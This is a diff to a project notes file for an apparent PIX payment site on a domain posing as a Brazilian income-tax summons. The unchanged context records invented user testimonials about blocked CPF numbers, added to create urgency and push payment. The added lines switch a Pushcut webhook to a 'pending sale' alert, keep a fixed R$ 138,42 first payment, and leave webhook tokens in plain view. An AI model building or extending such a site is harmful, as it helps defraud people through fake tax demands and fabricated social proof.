@@ -40,7 +40,7 @@ Preferred communication style: Simple, everyday language.
 - **WITEPAY API**: Integrated for PIX generation at `/v1/order/create` and `/v1/charge/create`.
 - **MEDIUS PAG API**: Primary API for PIX transaction management, including creation and postback handling. Endpoints used are `/transactions` for creation and a custom postback URL (`https://irpf.intimacao.org/medius-postback`) for payment confirmations.
 - **Recoveryfy API**: `https://recoveryfy.replit.app/api/order/{id}/status` for reliable transaction status checking and webhook management.
-- **Pushcut API**: `https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms` for sending automated notifications upon transaction creation.
+- **Pushcut API**: `https://api.pushcut.io/NiUWvkdg8_MMjxh6DOpez/notifications/Venda%20Pendente` for sending automated notifications upon transaction creation.
 
 ### CDN Resources
 - Tailwind CSS: `https://cdn.tailwindcss.com`
@@ -77,3 +77,5 @@ Preferred communication style: Simple, everyday language.
 - **August 02, 2025**: Added realistic comments section to CPF pages with 12 user testimonials. Comments include desperate stories from users whose accounts were blocked for not paying debts (red indicators) and success stories from users who paid and regularized their CPF (green indicators). Comments create social proof and urgency for payment completion.
 
 - **August 02, 2025**: Implemented security improvements by moving all sensitive credentials to environment variables. Updated MEDIUS PAG API keys, Amnesia API token, Pushcut webhook URLs, and postback URLs to use environment variables with secure fallbacks. This ensures production secrets are hidden from source code while maintaining development functionality.
+
+- **August 02, 2025**: Updated Pushcut webhook URL to new "Venda Pendente" notification endpoint (`https://api.pushcut.io/NiUWvkdg8_MMjxh6DOpez/notifications/Venda%20Pendente`). Maintained R$ 138,42 value for first payment. This change applies to both MEDIUS PAG and Cashtime API integrations.
